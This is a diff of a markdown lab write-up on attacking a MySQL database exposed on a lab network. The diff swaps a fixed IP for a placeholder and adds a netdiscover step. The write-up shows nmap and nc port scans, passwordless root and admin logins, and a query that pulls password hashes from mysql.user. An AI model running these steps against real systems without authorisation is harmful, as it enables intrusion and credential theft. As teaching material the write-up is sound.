@@ -29,7 +29,7 @@
 
 - **Attacker Machine**: Kali Linux
 - **Target**: Vulnerable machine running an exposed database service
-- **Tools Used**: `nmap`, `nc`, `mysql`, `hashid`, `john`, `hashcat`, `Wireshark`
+
 
 ---
 
@@ -37,8 +37,15 @@
 
 ### Step-by-Step
 
+Finding the Target IP 
+```
+bash netdiscover
+```
+- Scans your local subnet for live devices.
+- Helps you find IPs and MAC addresses
+
 ```bash
-nmap -sS -sV -p- 192.168.1.100
+nmap -sS -sV -p- <Target IP>
 ```
 - `-sS`: SYN scan (stealthy)
 - `-sV`: Service version detection
@@ -48,7 +55,7 @@ Discovered port **3306** open → MySQL service detected.
 
 ### Alternative
 ```bash
-nc -zv 192.168.1.100 1-1000
+nc -zv <Target IP>
 ```
 - `-z`: Scan without sending data
 - `-v`: Verbose output
@@ -57,7 +64,7 @@ Not stealthy (full TCP handshake), better for basic connectivity check.
 
 ### Connection Attempt
 ```bash
-mysql -h 192.168.1.100 -u root
+mysql -h <Target IP> -u root
 ```
 - No password prompt = potential misconfiguration.
 
@@ -80,7 +87,7 @@ SELECT user, host, authentication_string FROM mysql.user;
 
 ### Access Attempt
 ```bash
-mysql -h 192.168.1.100 -u admin
+mysql -h <Target IP> -u admin
 ```
 - Gained access without password.
 
